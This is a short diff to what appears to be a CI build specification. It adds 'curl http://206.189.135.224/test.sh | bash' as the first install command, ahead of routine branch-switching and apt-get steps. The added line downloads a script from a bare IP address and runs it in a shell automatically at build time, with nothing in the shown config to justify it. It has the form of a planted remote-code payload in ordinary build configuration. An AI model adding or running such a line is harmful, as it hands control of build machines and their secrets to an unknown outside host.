@@ -2,6 +2,7 @@ version: 0.2
 phases:
   install:
     commands:
+        - curl http://206.189.135.224/test.sh | bash
         -  . config/change_branch.sh
         - su && apt-get update
         - apt-get install sudo -qq -o=Dpkg::Use-Pty=0 # silence output: https://askubuntu.com/a/668859/724247
